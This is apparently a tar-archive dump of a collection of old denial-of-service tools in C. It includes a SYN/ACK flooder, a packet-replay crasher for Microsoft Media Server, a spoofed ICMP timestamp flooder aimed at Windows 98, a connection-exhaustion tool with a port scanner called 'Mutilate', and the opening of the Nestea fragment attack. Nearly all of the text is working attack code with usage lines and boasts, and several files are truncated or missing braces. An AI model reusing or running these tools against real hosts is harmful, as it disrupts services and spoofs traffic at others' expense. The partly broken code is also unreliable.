            "            while(atoi(argv[5]) > count)",
            "            { ",
            "           ",
            "            count++;",
            "            ",
            "            printf(\"sending packet from: %s:%i \",inet_ntoa(srcip),srcport);",
            "            printf(\"to %s:%i\\n\",inet_ntoa(dstip),dstport);",
            "            /* think about it, =-) */",
            "            srcport = srcport + 1;",
            "            dstport = dstport + 1;",
            "            sendpack(rawfd,srcip.s_addr,srcport,dstip.s_addr,dstport,TH_SYN,NULL,0);",
            "            sendpack(rawfd,srcip.s_addr,srcport,dstip.s_addr,dstport,TH_ACK,NULL,0);",
            "            ",
            "            ",
            "            }",
            "       ",
            "                       ",
            "       /*      printf(\"starting..\");",
            "               for(;;) {",
            "                       printf(\"foo..\");",
            "                       fflush(stdout);",
            "                       if ((rd=recvfrom(rawfd,buf,1024,0,(struct sockaddr *)&raddr,&rsize))<0) break;",
            "                       printf(\"%i\\n\",rd);",
            "               }*/ ",
            "               close(rawfd);",
            "               return(0);",
            "       }       ",
            "       ",
            "datapool/src/mmsu-dos.c",
            "0100644",
            "0000000",
            "0000000",
            "00000014041",
            "07076066120",
            "014063",
            "ustar  ",
            "root",
            "root",
            " * Microsoft Media Server 4.1 - Denial of Service Attack",
            " * This code will crash the Microsoft Media Unicast Server for",
            " * Windows NT.  We have tested this against machines running SP4",
            " * and SP6.",
            " * We have seen the entire machine become very unstable following",
            " * the crash of the unicast server.",
            " * Notified secure@microsoft.com Jan-18-2000 at 11:30 AM.",
            " * Microsoft advisory released Feb-23-2000.",
            " * http://www.microsoft.com/technet/security/bulletin/fq00-013.asp",
            "#include <stdio.h>",
            "#include <netinet/in.h>",
            "#include <sys/types.h>",
            "#include <sys/socket.h>",
            "#include <netdb.h>",
            "#include <arpa/inet.h>",
            "#include <string.h>",
            "#include <unistd.h>",
            "char packet1[] = {",
            "0x01, 0x00, 0x00, 0x00, 0xce, 0xfa, 0x0b, 0xb0, 0xa0, 0x00, 0x00, 0x00,",
            "0x4d, 0x4d, 0x53, 0x20, 0x14, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,",
            "0xf8, 0x53, 0xe3, 0xa5, 0x9b, 0xc4, 0x00, 0x40, 0x12, 0x00, 0x00, 0x00,",
            "0x01, 0x00, 0x03, 0x00, 0xf0, 0xf0, 0xf0, 0xf0, 0x0b, 0x00, 0x04, 0x00,",
            "0x1c, 0x00, 0x03, 0x00, 0x4e, 0x00, 0x53, 0x00, 0x50, 0x00, 0x6c, 0x00,",
            "0x61, 0x00, 0x79, 0x00, 0x65, 0x00, 0x72, 0x00, 0x2f, 0x00, 0x34, 0x00,",
            "0x2e, 0x00, 0x31, 0x00, 0x2e, 0x00, 0x30, 0x00, 0x2e, 0x00, 0x33, 0x00,",
            "0x38, 0x00, 0x35, 0x00, 0x37, 0x00, 0x3b, 0x00, 0x20, 0x00, 0x7b, 0x00,",
            "0x30, 0x00, 0x32, 0x00, 0x64, 0x00, 0x30, 0x00, 0x63, 0x00, 0x32, 0x00,",
            "0x63, 0x00, 0x30, 0x00, 0x2d, 0x00, 0x62, 0x00, 0x35, 0x00, 0x30, 0x00,",
            "0x37, 0x00, 0x2d, 0x00, 0x31, 0x00, 0x31, 0x00, 0x64, 0x00, 0x32, 0x00,",
            "0x2d, 0x00, 0x39, 0x00, 0x61, 0x00, 0x61, 0x00, 0x38, 0x00, 0x2d, 0x00,",
            "0x62, 0x00, 0x37, 0x00, 0x30, 0x00, 0x66, 0x00, 0x33, 0x00, 0x30, 0x00,",
            "0x34, 0x00, 0x34, 0x00, 0x61, 0x00, 0x65, 0x00, 0x37, 0x00, 0x65, 0x00,",
            "0x7d, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00",
            "char packet2[] = {",
            "0x01, 0x00, 0x00, 0x00, 0xce, 0xfa, 0x0b, 0xb0, 0x20, 0x00, 0x00, 0x00,",
            "0x4d, 0x4d, 0x53, 0x20, 0x04, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,",
            "0x5e, 0xba, 0x49, 0x0c, 0x02, 0x2b, 0x01, 0x40, 0x02, 0x00, 0x00, 0x00,",
            "0x18, 0x00, 0x03, 0x00, 0xf1, 0xf0, 0xf0, 0xf0, 0x0b, 0x00, 0x04, 0x00",
            "char packet3[] = {",
            "0x01, 0x00, 0x00, 0x00, 0xce, 0xfa, 0x0b, 0xb0, 0x60, 0x00, 0x00, 0x00,",
            "0x4d, 0x4d, 0x53, 0x20, 0x0c, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,",
            "0x83, 0xc0, 0xca, 0xa1, 0x45, 0xb6, 0x01, 0x40, 0x0a, 0x00, 0x00, 0x00,",
            "0x02, 0x00, 0x03, 0x00, 0xf1, 0xf0, 0xf0, 0xf0, 0xff, 0xff, 0xff, 0xff,",
            "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xa0, 0x00, 0x02, 0x00, 0x00, 0x00,",
            "0x5c, 0x00, 0x5c, 0x00, 0x31, 0x00, 0x39, 0x00, 0x32, 0x00, 0x2e, 0x00,",
            "0x31, 0x00, 0x36, 0x00, 0x38, 0x00, 0x2e, 0x00, 0x30, 0x00, 0x2e, 0x00,",
            "0x32, 0x00, 0x5c, 0x00, 0x54, 0x00, 0x43, 0x00, 0x50, 0x00, 0x5c, 0x00,",
            "0x31, 0x00, 0x31, 0x00, 0x31, 0x00, 0x31, 0x00, 0x00, 0x00, 0x32, 0x00,",
            "0x63, 0x00, 0x30, 0x00",
            "char packet4[] = {",
            "0x01, 0x00, 0x00, 0x00, 0xce, 0xfa, 0x0b, 0xb0, 0x88, 0x00, 0x00, 0x00,",
            "0x4d, 0x4d, 0x53, 0x20, 0x11, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00,",
            "0x2b, 0x87, 0x16, 0xd9, 0xce, 0xf7, 0x01, 0x40, 0x0f, 0x00, 0x00, 0x00,",
            "0x05, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff,",
            "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x54, 0x00, 0x68, 0x00,",
            "0x65, 0x00, 0x20, 0x00, 0x45, 0x00, 0x61, 0x00, 0x67, 0x00, 0x6c, 0x00,",
            "0x65, 0x00, 0x73, 0x00, 0x20, 0x00, 0x54, 0x00, 0x65, 0x00, 0x71, 0x00,",
            "0x75, 0x00, 0x69, 0x00, 0x6c, 0x00, 0x61, 0x00, 0x20, 0x00, 0x53, 0x00,",
            "0x75, 0x00, 0x6e, 0x00, 0x72, 0x00, 0x69, 0x00, 0x73, 0x00, 0x65, 0x00,",
            "0x20, 0x00, 0x32, 0x00, 0x38, 0x00, 0x6b, 0x00, 0x2f, 0x00, 0x65, 0x00,",
            "0x61, 0x00, 0x67, 0x00, 0x6c, 0x00, 0x65, 0x00, 0x73, 0x00, 0x32, 0x00,",
            "0x38, 0x00, 0x2e, 0x00, 0x61, 0x00, 0x73, 0x00, 0x66, 0x00, 0x00, 0x00,",
            "0x62, 0x00, 0x37, 0x00, 0x30, 0x00, 0x66, 0x00",
            "char packet5[] = {",
            "0x01, 0x00, 0x00, 0x00, 0xce, 0xfa, 0x0b, 0xb0, 0x48, 0x00, 0x00, 0x00,",
            "0x4d, 0x4d, 0x53, 0x20, 0x09, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,",
            "0x67, 0x66, 0x66, 0x66, 0x66, 0x66, 0x02, 0x40, 0x07, 0x00, 0x00, 0x00,",
            "0x15, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,",
            "0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff,",
            "0x65, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,",
            "0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0xac, 0x40, 0x02, 0x00, 0x00, 0x00,",
            "0x00, 0x00, 0x00, 0x00",
            "char packet6[] = {",
            "0x01, 0x00, 0x00, 0x00, 0xce, 0xfa, 0x0b, 0xb0, 0x30, 0x00, 0x00, 0x00,",
            "0x4d, 0x4d, 0x53, 0x20, 0x06, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,",
            "0x0a, 0xd7, 0xa3, 0x70, 0x3d, 0x0a, 0x11, 0x40, 0x04, 0x00, 0x00, 0x00,",
            "0x33, 0x00, 0x03, 0x00, 0x02, 0x00, 0x00, 0x00, 0xff, 0xff, 0x01, 0x00,",
            "0x00, 0x00, 0xff, 0xff, 0x02, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff,",
            "0x65, 0x00, 0x20, 0x00",
            "char packet7[] = {",
            "0x01, 0x00, 0x00, 0x00, 0xce, 0xfa, 0x0b, 0xb0, 0x38, 0x00, 0x00, 0x00,",
            "0x4d, 0x4d, 0x53, 0x20, 0x07, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00,",
            "0x2f, 0xdd, 0x24, 0x06, 0x81, 0x15, 0x11, 0x40, 0x05, 0x00, 0x00, 0x00,",
            "0x07, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00, 0xff, 0xff, 0x01, 0x00,",
            "0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff,",
            "0xff, 0xff, 0xff, 0xff, 0x16, 0xca, 0x03, 0x80, 0x04, 0x00, 0x00, 0x00",
            "int sock;",
            "int main(int argc, char *argv[]) {",
            "  struct hostent *he;",
            "  struct sockaddr_in sa;",
            "  char buf[1024];",
            "  if (argc != 2) {",
            "    fprintf(stderr, \"usage: %s <host/ip>\\n\", argv[0]);",
            "    return(-1);",
            "  sock = socket ( AF_INET, SOCK_STREAM, 0);",
            "  sa.sin_family = AF_INET;",
            "  sa.sin_port = htons(1755);",
            "  he = gethostbyname (argv[1]);",
            "  if (!he) {",
            "    if ((sa.sin_addr.s_addr = inet_addr(argv[1])) == INADDR_NONE)",
            "      return(-1);",
            "  } else {",
            "    bcopy(he->h_addr, (struct in_addr *) &sa.sin_addr, he->h_length);",
            "  if (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) < 0) {",
            "    fprintf(stderr, \"Fatal Error: Can't connect to Microsoft Media Server.\\n\");",
            "    return(-1);",
            "  write(sock, packet1, sizeof(packet1));",
            "  write(sock, packet2, sizeof(packet2));",
            "  write(sock, packet3, sizeof(packet3));",
            "  write(sock, packet4, sizeof(packet4));",
            "  write(sock, packet5, sizeof(packet5));",
            "  write(sock, packet6, sizeof(packet6));",
            "  write(sock, packet7, sizeof(packet7));",
            "  for (;;) {",
            "    read(sock, buf, sizeof(buf));",
            "/*                    www.hack.co.za                    */",
            "datapool/src/moyari13.c",
            "0100644",
            "0000000",
            "0000000",
            "00000015660",
            "07065770070",
            "013777",
            "ustar  ",
            "root",
            "root",
            "/*Hi,",
            ">Windows 98's TCP/IP stack chokes on fragmented IGMP packets.",
            "Windows 98's TCP/IP stack chokes on ICMP-Type13( timestamp request)",
            "packets, too.",
            "Signed by R00t Zer0",
            "E-mail : defcon0@ugtop.com",
            "Website: http://www.ugtop.com/defcon0/index.htm (ISO-2022-JP only :-(",
            "----------------------------------------------------------------------",
            "/* moyari13.c   by R00t Zer0( defcon0@ugtop.com) */",
            "#include <stdio.h>",
            "#include <stdlib.h>",
            "#include <string.h>",
            "#include <unistd.h>",
            "#include <netdb.h>",
            "#include <sys/socket.h>",
            "#include <sys/types.h>",
            "#include <netinet/in.h>",
            "#include <netinet/ip.h>",
            "#include <netinet/ip_icmp.h>",
            "#define __FAVOR_BSD",
            "#include <netinet/tcp.h>",
            "#include <netinet/in_systm.h>",
            "#include <arpa/inet.h>",
            "#define IP_SIZE         sizeof( struct iphdr )",
            "u_short",
            "in_cksum( u_short *addr, int len )",
            "    {",
            "    int     nleft   = len;",
            "    u_short *w      = addr;",
            "    int     sum     = 0;",
            "    u_short answer  = 0;",
            "    /*",
            "     * Our algorithm is simple, using a 32 bit accumulator (sum), we add",
            "     * sequential 16 bit words to it, and at the end, fold back all the",
            "     * carry bits from the top 16 bits into the lower 16 bits.",
            "     */",
            "    while( nleft > 1 )",
            "        {",
            "        sum += *w++;",
            "        nleft -= 2;",
            "        }",
            "    /* mop up an odd byte, if necessary */",
            "    if (nleft == 1)",
            "        {",
            "        *( u_char *)( &answer ) = *( u_char *)w;",
            "        sum += answer;",
            "        }",
            "    /* add back carry outs from top 16 bits to low 16 bits */",
            "    sum  = ( sum >> 16 ) + ( sum & 0xffff );    /* add hi 16 to low 16 */",
            "    sum += ( sum >> 16 );                       /* add carry           */",
            "    answer = ~sum;                              /* truncate to 16 bits */",
            "    return( answer );",
            "    }",
            "send_icmp_packet( int sock_send, u_long src_addr, u_long dst_addr )",
            "    {",
            "    char    *packet, *cksum;        /* packet, cksum    */",
            "    int     send_status, loop;",
            "    struct  iphdr       *ip;        /* ip header        */",
            "    struct  icmp        *icp;       /* icmp header      */",
            "    struct  sockaddr_in from;       /* sockaddr         */",
            "    struct  sockaddr_in to;         /* sockaddr         */",
            "    /************************************/",
            "    /* get and init packet_memory_area  */",
            "    /************************************/",
            "    packet  = ( char *)malloc( IP_SIZE + 20 );",
            "    ip      = ( struct iphdr *)( packet );",
            "    icp     = ( struct  icmp *)( packet + IP_SIZE );",
            "    memset( packet, 0, IP_SIZE + 20 );",
            "    /****************/",
            "    /* IP header    */",
            "    /****************/",
            "    ip->saddr       = src_addr;",
            "    ip->daddr       = dst_addr;",
            "    ip->version     = 4;",
            "    ip->ihl         = IP_SIZE / 4;",
            "    ip->ttl         = 255;",
            "    ip->protocol    = IPPROTO_ICMP;",
            "    ip->id          = 0x01;",
            "    ip->tot_len     = htons( IP_SIZE + 20 );",
            "    ip->check       = in_cksum( (u_short *)ip, IP_SIZE );",
            "    /****************/",
            "    /*  ICMP header */",
            "    /****************/",
            "    icp->icmp_type  = 13;",
            "    icp->icmp_code  = 0;",
            "    icp->icmp_cksum = 0;",
            "    /************************************/",
            "    /* ICMP_id, ICMP_sequence = 0xffff  */",
            "    /************************************/",
            "    for( loop = IP_SIZE + 4; loop < IP_SIZE + 4 + 4; loop++ )",
            "        *( packet + loop ) = 0xff;",
            "    /********************************************************/",
            "    /* ICMP_type13_otime/rtime/ttime = rand() % 0xffffffff  */",
            "    /********************************************************/",
            "    for( loop = IP_SIZE + 4 + 4; loop < IP_SIZE + 4 + 4 + 12; loop++ )",
            "        *( packet + loop ) = rand() % 0xff;",
            "    /************************/",
            "    /* set ICMP_checksum    */",
            "    /************************/",
            "    icp->icmp_cksum = in_cksum( ( u_short *)( packet + IP_SIZE ),",
            "                                4 + 16 );",
            "    /********************/",
            "    /* send 1 packets   */",
            "    /********************/",
            "    bzero( (char *)&to, sizeof( to ) );",
            "    to.sin_family           = AF_INET;",
            "    to.sin_addr.s_addr      = ip->daddr;",
            "    send_status = sendto( sock_send, packet, IP_SIZE + 20, 0,",
            "                          ( struct sockaddr *)&to, sizeof( struct sockaddr ) );",
            "    free( packet );",
            "    return( send_status );",
            "    }",
            "main( int argc, char *argv[] )",
            "    {",
            "    char    tmp_buffer[ 1024 ];         /* tmp_buffer                   */",
            "    int     loop, loop2;                /* loop counter                 */",
            "    int     sock_send;                  /* socket_fd                    */",
            "    u_long  src_addr, dst_addr;         /* src/dst addr                 */",
            "    time_t  t;                          /* init_rand_seed(time)         */",
            "    struct  hostent     *host;          /* hostinfo(hostent)            */",
            "    struct  sockaddr_in addr;           /* (sockaddr_in)addr            */",
            "    /************************/",
            "    /*  print usage(error)  */",
            "    /************************/",
            "    if( argc != 3 )",
            "        {",
            "        printf( \"Usage : %s <dst addr> <count>\\n\", argv[0] );",
            "        exit( -1 );",
            "        }",
            "    /********************/",
            "    /*  init rand_seed  */",
            "    /********************/",
            "    t = time( 0 );",
            "    srand( ( u_int )t );",
            "    /********************/",
            "    /* Get src_address  */",
            "    /********************/",
            "    gethostname( tmp_buffer, 128 );",
            "    host = gethostbyname( tmp_buffer );",
            "    if( host == NULL )",
            "        {",
            "        printf( \"Can't get this machine's hostname\\n\" );",
            "        exit( -1 );",
            "        }",
            "    memcpy( &src_addr, host->h_addr, 4 );",
            "    /********************/",
            "    /* Get dst_address  */",
            "    /********************/",
            "    memset( &addr, 0, sizeof( struct sockaddr_in ) );",
            "    addr.sin_family         = AF_INET;",
            "    addr.sin_addr.s_addr    = inet_addr( argv[1] );",
            "    if( addr.sin_addr.s_addr == -1 )",
            "        {",
            "        host = gethostbyname( argv[1] );",
            "        if( host == NULL )",
            "            {",
            "            printf( \"Unknown host %s.\\n\", argv[1] );",
            "            exit( -1 );",
            "            }",
            "        addr.sin_family = host->h_addrtype;",
            "        memcpy( ( caddr_t )&addr.sin_addr, host->h_addr, host->h_length );",
            "        }",
            "    memcpy( &dst_addr, ( char *)&addr.sin_addr.s_addr, 4 );",
            "    /********************/",
            "    /* open RAW_socket  */",
            "    /********************/",
            "    if( ( sock_send = socket( AF_INET, SOCK_RAW, IPPROTO_RAW ) ) == -1)",
            "        {",
            "        perror( \"Getting raw send socket\" );",
            "        exit( -1 );",
            "        }",
            "#if 0   /* fake */",
            "    src_addr = inet_addr( \"89.89.89.89\" );",
            "#endif",
            "    /****************************/",
            "    /*  - m o - y a - r i -     */",
            "    /****************************/",
            "    printf( \"[ moyari13 ( TimeStump request) Attack ]\\n\\n\" );",
            "    printf( \"sending...\" );",
            "    for( loop = 0; loop < atoi( argv[2] ); loop++ )",
            "        {",
            "#if 1   /* spoof( random ) */",
            "        src_addr = rand() % 0xffffffff;",
            "#endif",
            "        send_icmp_packet( sock_send, src_addr, dst_addr );",
            "        printf( \".\" );",
            "        fflush( stdout );",
            "        }",
            "    printf( \"\\nDone.\\n\" );",
            "    close( sock_send );",
            "    exit( 0 );",
            "    }",
            ": Asta Yuuno -   http://www.espada.net/~asta/  - asta@espada.net :",
            ": Voice: +89-117-31337 - Fax: +89-117-31337(push *)              :",
            ": --                                                          -- :",
            ": \"HP/UX is the worst OS for the hacker...\" - Mark Abene         :",
            "datapool/src/mutilate.c",
            "0100644",
            "0000000",
            "0000000",
            "00000011151",
            "07077161222",
            "014142",
            "ustar  ",
            "root",
            "root",
            " /*********************************************",
            " *  Mutilate v1.0                             * ",
            " * By HoGs HeaD                               * ",
            " * ------------------------------------------ * ",
            " * What this program does:                    *  ",
            " * ------------------------------------------ * ",
            " * This is a port mutilator, connects as      *",
            " * many times as possible to a port resulting *",
            " * in a DoS attack or lag kill. Run it on     *",
            " * a small FTP server or telnet server and    *",
            " * watch the daemons fall....                 *",
            " * Fear the built-in port scanner!            *",
            " * Build using:                               *",
            " *                                            *  ",
            " * $ gcc mutilate -o mutilate.c               * ",
            " *                                            *",
            " * You can't modify this and redistribute it  *",
            " * unless i have given you permission.        * ",
            " *                                            *",
            " * (C)1998 HoGs HeaD & Inertia                *",
            " *********************************************/",
            "#include <stdio.h>",
            "#include <sys/socket.h>",
            "#include <sys/time.h>",
            "#include <netinet/in.h>",
            "#include <netinet/in_systm.h>",
            "#include <netinet/ip.h>",
            "#include <netinet/ip_icmp.h>",
            "#include <errno.h>",
            "#include <netdb.h>",
            "#include <signal.h>",
            "#define PROG_NAME \"Mutilate\"",
            "#define HIGH_PORT 1024",
            "/***************",
            "* Usage Table  *",
            "****************/",
            "void usage()",
            "printf(\"usage: %s <IP address> <port (or -s for scan)>\\n\\n\", PROG_NAME);",
            "exit(0);",
            "/****************",
            "* Title Banner  *",
            "*****************/",
            "void banner()",
            "puts(\"\\nMutilate by HoGs HeaD and Inertia\");",
            "puts(\"----------------------------------\\n\");",
            "/********************",
            "* PortScan Function *",
            "********************/",
            "void portscan(char *the_ip)",
            "{   ",
            "   struct hostent *scand;          /* Well golly jeepers batman, let's init some shiz... */",
            "   struct sockaddr_in scan;",
            "   int sck; ",
            "   int c, portnum;",
            "     for(portnum=1; portnum<HIGH_PORT; portnum++){                /* start the hunt.. */",
            "       if(isdigit(*the_ip)){",
            "         scan.sin_addr.s_addr = inet_addr(the_ip);",
            "     } else{                                                 /* resolve the host */",
            "         scand = gethostbyname(the_ip);",
            "         strncpy((char *)&scan.sin_addr, (char *)scand->h_addr, sizeof(scan.sin_addr));     ",
            "           }",
            "     scan.sin_family = AF_INET;",
            "     scan.sin_port   = htons(portnum);",
            "     sck = socket(AF_INET, SOCK_STREAM, 0);               /* create the socket */",
            "    ",
            "       if(sck < 0){",
            "         printf(\"Socket cannot be established!\\n\");",
            "                  }",
            "     c = connect(sck, (struct sockaddr *)&scan, sizeof(scan)); /* connect the socket */",
            "       if(c < 0){",
            "                  /* we aren't connected, so... */",
            "     } else{",
            "                 /* we're connected, bewm, notify user. */",
            "         printf(\"Found an open port on %d...\\n\", portnum);",
            "           }",
            " shutdown(sck, 2);",
            " close(sck);",
            "/****************",
            "* Main Function *",
            "****************/",
            "void main(int argc, char **argv)",
            "    struct hostent *th;",
            "    struct sockaddr_in target[400];",
            "    int count=1;",
            "    int sock, error, port;",
            "    char *curr_ip;",
            "   banner();",
            "   if(argc < 3){",
            "     usage();",
            "              }",
            "  curr_ip = argv[1];",
            "    if (!strcmp (argv[2], \"-s\")) {",
            "      printf(\"Beginning a port scan on %s...\\n\\n\", argv[1]);",
            "      portscan(argv[1]);",
            "        exit(0);",
            "                                 }",
            "  port = atoi(argv[2]);",
            "  printf(\"Now opening connections to %s...\\n\\n\", curr_ip);",
            " /*******************   ",
            " * Begin Mutilation *",
            " *******************/",
            " for(; count<400; ++count) ",
            " {  ",
            "   if(isdigit(*curr_ip))     /* If the host specified is a numerical IP */",
            "     target[count].sin_addr.s_addr = inet_addr(curr_ip);     ",
            "   else {                    /* If the host specified as a hostname */",
            "     th = gethostbyname(curr_ip);",
            "     strncpy((char *)&target[count].sin_addr, (char *)th->h_addr, sizeof(target[count].sin_addr));",
            "        }",
            "      target[count].sin_family = AF_INET;",
            "      target[count].sin_port = htons(port);",
            "      sock = socket(AF_INET, SOCK_STREAM, 0);",
            "    if(sock < 0){",
            "      printf(\"Error setting up socket!\\n\");",
            "      exit(2);",
            "                }",
            "      error = connect(sock, (struct sockaddr *)&target[count], sizeof target[count]);",
            "    if(error < 0) ",
            "      printf(\"Error connecting to: %d : %s\\n\", port, strerror(errno));",
            "    else {",
            "      printf(\"Opened %d sockets to host...\\n\", count);",
            "         }  ",
            "                         ",
            "  printf(\"\\nOpened 400 socks to server, ending...\\n\");",
            "  close(sock);",
            "/***************",
            "* End Program  *",
            "***************/",
            "datapool/src/nestea2.c",
            "0100644",
            "0000000",
            "0000000",
            "00000032663",
            "07100655563",
            "013675",
            "ustar  ",
            "root",
            "root",
            "#include <stdio.h>",
            "#include <stdlib.h>",
            "#include <unistd.h>",
            "#include <string.h>",
            "#include <netdb.h>",
            "#include <netinet/in.h>",
            "#include <netinet/udp.h>",
            "#include <arpa/inet.h>",
            "#include <sys/types.h>",
            "#include <sys/time.h>",
            "#include <sys/socket.h>",
            "#ifdef STRANGE_BSD_BYTE_ORDERING_THING",
            "                        /* OpenBSD < 2.1, all FreeBSD and netBSD, BSDi < 3.0 */",
            "#define FIX(n)  (n)",
            "#else                   /* OpenBSD 2.1, all Linux */",
            "#define FIX(n)  htons(n)",
            "#endif  /* STRANGE_BSD_BYTE_ORDERING_THING */",
            "#define IP_MF   0x2000  /* More IP fragment en route */",
            "#define IPH     0x14    /* IP header size */",
            "#define UDPH    0x8     /* UDP header size */",
            "#define MAGIC2  108",
            "#define PADDING 256    /* datagram frame padding for first packet */",
            "#define COUNT   500    /* we are overwriting a small number of bytes we ",
            "\t\t\tshouldnt have access to in the kernel. ",
            "\t\t\tto be safe, we should hit them till they die :>  */",
            "struct ipstuph",
            "\tint p1;",
            "\tint p2;",
            "\tint p3;",
            "\tint p4;",
            "} startip, endip;",
            "void usage(u_char *);",
            "u_long name_resolve(u_char *);",
            "u_short in_cksum(u_short *, int);",
            "void send_frags(int, u_long, u_long, u_short, u_short);",
            "int main(int argc, char **argv)",
            "    int one = 1, count = 0, i, rip_sock, j, bequiet = 0;",
            "    u_long  src_ip = 0, dst_ip = 0;",
            "    u_short src_prt = 0, dst_prt = 0;",
            "    char hit_ip[18], dst_ip2[18];",
            "    struct in_addr addr;",
            "    ",
            "    fprintf(stderr, \"\\n",
            "[1;34mNestea v2 ",
            "[0;34moriginally by",
            "[0m: ",
            "[1;34mhumble ",
            "[0;34m+ ",
            "[1;34mttol mods",
            "[0m\\n\");",
            "    fprintf(stderr, \"",
            "[0;34mColor and Instructions was done by ",
            "[0m: ",
            "[1;34mttol",
            "[0m\\n\");",
            "    fprintf(stderr, \"",
            "[1;34mNote",
            "[0m : ",
            "[1;34mttol released Nestea v2.  humble had nothing to do with \\n       it, don't nag him about it.  -ttol@ttol.net",
            "[0m\\n\\n\");",
            "    ",
            "    if((rip_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)",
            "    {",
            "        perror(\"",
            "[1;34mraw socket",
            "[0m\");",
            "        exit(1);",
            "    }",
            "    if (setsockopt(rip_sock, IPPROTO_IP, IP_HDRINCL, (char *)&one, sizeof(one))",
            "        < 0)",
            "    {",
            "        perror(\"IP_HDRINCL\");",
            "        exit(1);",
            "    }",
            "    if (argc < 4) usage(argv[0]);",
            "    if (!(src_ip = name_resolve(argv[1])) || !(dst_ip = name_resolve(argv[2])))",
            "    {",
            "        fprintf(stderr, \"",
            "[1;34mWhat the hell kind of IP address is that?",
            "[0m\\n\");",
            "        exit(1);",
            "    }",
            "    strcpy(dst_ip2,argv[3]);",
            "    if(sscanf(argv[2],\"%d.%d.%d.%d\",&startip.p1,&startip.p2,&startip.p3,",
            "                      &startip.p4) != 4)",
            "    {",
            "      fprintf(stderr, \"",
            "[1;34mError, arg2(startip) ",
            "[0m: ",
            "[0;34mNeed an ip that contains 4 zones",
            "[0m\\n\");                           ",
            "      exit(1);",
            "    }",
            "    if (startip.p1 > 255) {",
            "      fprintf(stderr, \"",
            "[1;34mError ",
            "[0m: ",
            "[0;34mZone 1 of start ip is incorrect \\",
            "                       (greater than 255)",
            "[0m\\n\");",
            "      exit(1);",
            "    }",
            "    if (startip.p2 > 255) {",
            "      fprintf(stderr, \"",
            "[1;34mError ",
            "[0m: ",
            "[0;34mZone 2 of start ip is incorrect \\",
            "                       (greater than 255)",
            "[0m\\n\");",
            "      exit(1);",
            "    }",
            "    if (startip.p3 > 255) {",
            "      fprintf(stderr, \"",
            "[1;34mError ",
            "[0m: ",
            "[0;34mZone 3 of start ip is incorrect \\",
            "                       (greater than 255)",
            "[0m\\n\");",
            "      exit(1);",
            "    }",
            "    if (startip.p4 > 255) {",
            "      fprintf(stderr, \"",
            "[1;34mError ",
            "[0m: ",
            "[0;34mZone 4 of start ip is incorret \\",
            "                       (greater than 255)",
            "[0m\\n\");",
            "       exit(1);",
            "    }",
            "    if(sscanf(argv[3],\"%d.%d.%d.%d\",&endip.p1,&endip.p2,&endip.p3,",
            "                      &endip.p4) != 4)",
            "    {",
            "      fprintf(stderr, \"",
            "[1;34mError, arg3(endip) ",
            "[0m: [[0;34mNeed an ip that \\",
            "                       contains 4 zones[[0m\\n\");",
            "      exit(1);",
            "    }",
            "    if (endip.p1 > 255) {",
            "      fprintf(stderr, \"",
            "[1;34mError ",
            "[0m: ",
            "[0;34mZone 1 of end ip is incorrect \\",
            "                       (greater than 255)",
            "[0m\\n\");",
            "      exit(1);",
            "    }",
            "    if (endip.p2 > 255) {",
            "      fprintf(stderr, \"",
            "[1;34mError ",
            "[0m: ",
            "[0;34mZone 2 of end ip is incorrect \\",
            "                       (greater than 255)",
            "[0m\\n\");",
            "      exit(1);",
            "    }",
            "    if (endip.p3 > 255) {",
            "      fprintf(stderr, \"",
            "[1;34mError ",
            "[0m: ",
            "[0;34mZone 3 of end ip is incorrect",
            "                       (greater than 255)",
            "[0m\\n\");",
            "      exit(1);",
            "    }",
            "    if (endip.p4 > 255) {",
            "      fprintf(stderr, \"",
            "[1;34mError ",
            "[0m: ",
            "[0;34mZone 4 of end ip is incorrect",
            "                       (greater than 255)",
            "[0m\\n\");",
            "      exit(1);",
            "    }",
            "    if (startip.p1 != endip.p1) {",
            "      fprintf(stderr, \"",
            "[1;34mError ",
            "[0m: ",
            "[0;34mZone 1 of start ip and end ip is different",
            "[0m\\n\");",
            "      exit(1);",
            "    }",
            "    if (startip.p2 != endip.p2) {",
            "      fprintf(stderr, \"",
            "[1;34mError ",
            "[0m: ",
            "[0;34mZone 2 of start ip and end ip is different",
            "[0m\\n\");",
            "      exit(1);",
            "    }",
            "    if (startip.p3 != endip.p3) {",
            "      fprintf(stderr, \"",
            "[1;34mError ",
            "[0m: ",
            "[0;34mZone 3 of start ip and end ip is different",
            "[0m\\n\");",
            "      exit(1);",
            "    }",
            "                                        ",
            "    while ((i = getopt_long(argc, argv, \"s:t:n:q\")) != EOF)",
            "    {",
            "        switch (i)",
            "        {",
            "            case 's':               /* source port (should be emphemeral) */",
            "                src_prt = (u_short)atoi(optarg);",
            "                break;",
            "            case 't':               /* dest port (DNS, anyone?) */",
            "                dst_prt = (u_short)atoi(optarg);",
            "                break;",
            "            case 'n':               /* number to send */",
            "                count   = atoi(optarg);",
            "                break;",
            "            case 'q':               /* quiet mode */",
            "                bequiet = 1;",
            "                break;                                                      ",
            "            default :",
            "                usage(argv[0]);",
            "                break;              /* NOTREACHED */",
            "        }",
            "    }",
            "    srandom((unsigned)(time((time_t)0)));",
            "    if (!src_prt) src_prt = (random() % 0xffff);",
            "    if (!dst_prt) dst_prt = (random() % 0xffff);",
            "    if (!count)   count   = COUNT;",
